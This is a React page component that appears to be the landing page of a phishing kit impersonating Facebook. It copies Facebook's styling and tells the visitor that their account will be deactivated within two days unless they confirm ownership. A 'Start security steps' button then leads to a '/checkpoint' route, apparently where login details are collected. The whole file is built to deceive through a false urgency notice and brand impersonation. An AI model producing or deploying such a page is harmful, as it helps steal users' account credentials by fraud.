import { useNavigate } from "react-router-dom";
import PrimaryButton from "../Components/UI/PrimaryBtn";

const Home = () => {
  const navigate = useNavigate();

  return (
    <div
      style={{
        height: "100vh",
        background: "#f0f2f5",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          padding: "1rem",
          paddingTop: "1.75rem",
          borderRadius:
            "max(0px, min(8px, ((100vw - 4px) - 100%) * 9999)) / 8px",
          backgroundColor: "#fff",
          boxShadow: "0 1px 2px rgba(0, 0, 0, 0.2)",
          width: "100%",
          maxWidth: "600px",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}
      >
        <img
          src="/intro.png"
          style={{
            width: "120px",
            borderRadius: "50%",
            position: "top",
          }}
          alt=""
        />
        <h1
          style={{
            marginTop: "2rem",
            fontWeight: "600",
            fontSize: "1.5rem",
            textAlign: "center",
          }}
        >
          Hi, we need to confirm this account belongs to you
        </h1>

        <h4
          style={{
            fontSize: 17,
            fontWeight: 300,
            color: "#050505",
            textAlign: "center",
            marginTop: "1rem",
          }}
        >
          Your account will be deactivated in the next two days. No one can see
          this Facebook profile or use the account until you confirm it's yours.
        </h4>

        <div
          style={{
            borderRadius: 6,
            padding: ".75rem 1rem",
            backgroundColor: "#f7f8fa",
            display: "flex",
            marginTop: "2.2rem",
            width: "100%",
          }}
        >
          <div>
            <div
              style={{
                width: 36,
                height: 36,
                background: "#1877F2",
                borderRadius: "50%",
                marginRight: 20,
              }}
            >
              <i
                style={{
                  backgroundImage: 'url("/icons.png")',
                  backgroundPosition: "0px -411px",
                  backgroundSize: "25px 542px",
                  width: 20,
                  height: 20,
                  backgroundRepeat: "no-repeat",
                  display: "inline-block",
                  filter: "invert(1)",
                  margin: "auto",
                }}
              />
            </div>
          </div>

          <div>
            <h5
              style={{
                fontWeight: 500,
                fontSize: 17,
                marginBottom: 0,
              }}
            >
              Log in using another device
            </h5>
            <span
              style={{
                fontSize: 15,
                fontWeight: 300,
              }}
            >
              This must be a device you’ve used to log into this account before.
            </span>
          </div>
        </div>

        <div
          style={{
            height: 1,
            width: "100%",
            background: "#dadde1",
            marginTop: "1rem",
            marginBottom: "1.25rem",
          }}
        ></div>

        <div
          style={{
            width: "100%",
          }}
        >
          <h1
            style={{
              fontWeight: "600",
              fontSize: "1.5rem",
              marginBottom: 10,
            }}
          >
            If you don’t have another device
          </h1>
          <h4
            style={{
              fontWeight: 300,
              fontSize: "15px",
            }}
          >
            You’ll need to complete some security steps to confirm this is your
            account.
          </h4>

          <PrimaryButton
            btnstyle={{
              height: 36,
              marginTop: "1.5rem",
            }}
            onClick={() =>
              navigate("/checkpoint", {
                replace: true,
              })
            }
            text={"Start security steps"}
          />
        </div>
      </div>
    </div>
  );
};

export default Home;
